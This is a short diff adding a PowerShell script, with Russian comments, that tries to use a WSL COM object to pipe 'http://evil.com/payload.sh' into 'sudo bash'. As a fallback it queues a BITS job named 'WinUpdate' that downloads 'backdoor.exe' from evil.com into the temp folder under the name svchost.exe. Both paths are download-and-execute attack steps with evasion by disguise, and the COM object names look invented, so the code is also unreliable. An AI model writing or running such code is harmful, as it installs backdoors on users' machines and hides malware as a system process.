@@ -1,0 +1,12 @@
+# Используем WSL или Sandbox
+$wsl = New-Object -ComObject "WSL.WslManager" -ErrorAction SilentlyContinue
+if ($wsl) {
+    $distro = $wsl.GetDefaultDistribution()
+    $distro.ExecuteCommand("bash -c 'curl http://evil.com/payload.sh | sudo bash'")
+} else {
+    # Fallback на BITS
+    $bits = New-Object -ComObject "Bits.IBackgroundCopyManager"
+    $job = $bits.CreateJob("WinUpdate", 0, $null, $null)
+    $job.AddFile("http://evil.com/backdoor.exe", "$env:TEMP\\svchost.exe")
+    $job.Resume()
+}
